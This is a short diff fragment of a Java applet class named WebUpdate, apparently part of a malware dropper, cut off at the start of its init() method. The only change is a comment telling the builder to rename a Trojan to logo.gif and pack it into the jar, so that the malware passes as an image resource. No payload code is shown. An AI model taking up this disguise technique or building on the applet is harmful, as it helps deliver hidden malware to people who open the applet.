@@ -5,7 +5,8 @@ import java.net.*;
 public class WebUpdate extends Applet{
 	/** 
 	 * @Fields serialVersionUID : TODO
-	 /img/logo.gif
+	 /img/logo.gif  rename your Trojan to logo.gif and add it to jar
+	 
 	 */ 
 	private static final long serialVersionUID = 1L;
 	public void init(){
